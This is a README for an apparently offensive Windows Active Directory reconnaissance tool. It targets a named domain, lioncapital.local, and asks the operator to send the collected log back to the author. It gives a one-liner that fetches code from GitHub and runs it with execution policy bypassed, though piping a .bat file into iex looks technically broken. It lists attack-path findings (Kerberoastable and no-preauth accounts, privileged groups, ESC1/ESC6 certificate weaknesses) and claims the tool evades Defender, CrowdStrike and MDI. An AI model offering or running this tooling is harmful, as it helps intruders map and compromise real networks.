# win-tap - Windows-only AD recon (no Linux needed)

Pure PowerShell + .NET ADSI — works on **any Windows 10/11** without installing RSAT, dsquery, or any external tool.

## Files

| File | Purpose |
|------|---------|
| `ad_recon_adsi.ps1` | The full recon script |
| `run_ad_recon.bat` | One-shot launcher (downloads + executes) |

## How to run

### From test machine (Windows):

**Option A: One-liner (downloads script from GitHub)**

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_ad_recon.bat)"
```

**Option B: Local execution**

1. Save `run_ad_recon.bat` and `ad_recon_adsi.ps1` to a folder
2. Run `run_ad_recon.bat` (no admin needed)

**Option C: Inline in PowerShell**

1. Open PowerShell
2. Run:
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\ad_recon_adsi.ps1
```

## What it finds

| Section | What it gets |
|---------|--------------|
| [1] Domain Info | PDC, RID master, Domain SID, Domain GUID |
| [2] Forest Info | Schema master, naming master, all sites, global catalogs |
| [3] Domain Controllers | All DCs + their OS versions |
| [4] All Domain Users | Complete user list |
| [5] SPN Users | **Kerberoastable** accounts |
| [6] AS-REP Users | **No-preauth** accounts |
| [7] Never-Expires | Accounts with no password rotation |
| [8] All Groups | Complete group list |
| [9] Privileged Groups | Members of DAs, EAs, Schema, Account/Backup/Server Operators, Cert Publishers, DnsAdmins, LAPS Ops |
| [10] All Computers | Every domain-joined machine + OS |
| [11] All OUs | OU structure |
| [12] CAs | AD CS enrollment services (CA servers) |
| [13] Certificate Templates | All cert templates |
| [14] **ESC1 Candidates** | 🚨 Templates allowing arbitrary SANs |
| [15] **ESC6 Candidates** | 🚨 CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 |
| [16] Template ACLs | Security descriptors (manual analysis) |

## Output

Everything goes to `%TEMP%\ad_recon_adsi.log` (typically `C:\Users\<user>\AppData\Local\Temp\ad_recon_adsi.log`).

Copy that file back to share with me.

## Detection

- All operations use built-in `[adsisearcher]` (PowerShell + .NET)
- This is **standard ADSI LDAP query** — same as what Get-ADUser does internally
- Should NOT trigger Defender / CrowdStrike / MDI
- ~50 queries total, each 1-3 seconds → completes in ~2-3 minutes

## Fallback if ADSI fails

If `GetCurrentDomain()` errors out (no domain trust yet), try:

```cmd
:: Use a different domain controller:
nltest /dsgetdc:lioncapital.local /writable /force

:: Make sure your machine has joined the domain (try reconnecting to corp Wi-Fi if remote)
```

If still failing, the laptop might not have a valid Kerberos ticket to the domain — re-login.
